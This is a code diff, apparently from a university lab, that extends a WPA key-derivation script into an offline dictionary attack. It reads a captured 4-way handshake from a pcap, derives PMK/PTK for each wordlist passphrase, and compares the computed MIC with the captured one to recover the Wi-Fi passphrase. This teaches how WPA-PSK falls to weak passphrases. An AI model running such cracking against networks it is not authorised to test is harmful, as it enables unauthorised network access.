@@ -6,7 +6,8 @@ Derive WPA keys from Passphrase and 4-way handshake info
 
 Calcule un MIC d'authentification (le MIC pour la transmission de données
 utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+sha-1 pour WPA2 ou MD5 pour WPA) pour chaque passphrase. On va alors 
+comparer avec le mic pour trouver la passphrase du dico. 
 """
 
 __author__    = "Dylan Canton & Christian Zaccaria"
@@ -39,6 +40,8 @@ def customPRF512(key,A,B):
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("wpa_handshake.pcap") 
+passphrase_file = "passPhrases.txt"
+passphrase_status = "Not found"
 
 # on prend les frames nécessaires : le beacon frame, ainsi que les handshake 1,2 et 4
 beacon = wpa[0]
@@ -78,23 +81,44 @@ print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
 print ("AP Nonce: ",b2a_hex(ANonce),"\n")
 print ("Client Nonce: ",b2a_hex(SNonce),"\n")
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
 ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
-#expand pmk to obtain PTK
-ptk = customPRF512(pmk,str.encode(A),B)
+# On va parcourir le fichier txt afin de checker toutes les passphrases présentes
+with open(passphrase_file) as file:
+    for passphrase in file:
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+        # Besoin d'enlever le caractère "\n" sinon les passphrases seront comparé avec ce caractères et ne seront jamais correctes
+        if passphrase[-1:] == "\n":
+            passphrase = passphrase[:-1]
+        
+        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        passPhrase = str.encode(passphrase)
+        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex(),"\n")
-print ("PTK:\t\t",ptk.hex(),"\n")
-print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-print ("TK:\t\t",ptk[32:48].hex(),"\n")
-print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-print ("MIC:\t\t",mic.hexdigest(),"\n")
+        #expand pmk to obtain PTK
+        ptk = customPRF512(pmk,str.encode(A),B)
+
+        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK / Besoin de check le type de hash qui doit être utilisé
+        mic = hmac.new(ptk[0:16],data,hashlib.md5) if int.from_bytes(handshake_f1.load[0:1], byteorder='big') != 2 else hmac.new(ptk[0:16],data,hashlib.sha1)
+
+        #On check le mic trouvé avec celui de la passphrase = si c'est le même c'est qu'il est trouvé.
+        if mic.hexdigest()[:-8] == b2a_hex(mic_to_test).decode():
+
+            #Print d'information
+            print ("\nResults of the key expansion")
+            print ("=============================")
+            print ("PMK:\t\t",pmk.hex(),"\n")
+            print ("PTK:\t\t",ptk.hex(),"\n")
+            print ("KCK:\t\t",ptk[0:16].hex(),"\n")
+            print ("KEK:\t\t",ptk[16:32].hex(),"\n")
+            print ("TK:\t\t",ptk[32:48].hex(),"\n")
+            print ("MICK:\t\t",ptk[48:64].hex(),"\n")
+            print ("MIC:\t\t",mic.hexdigest(),"\n")
+            #On ajoute la passphrase à la variable d'état
+            passphrase_status = passPhrase.decode()
+            break
+
+    # Affichage du résultat (Si not found = aucune passphrase du fichier correspond)
+    print("Result of process ")
+    print("==================")
+    print("Passphrase is : ", passphrase_status, "\n")
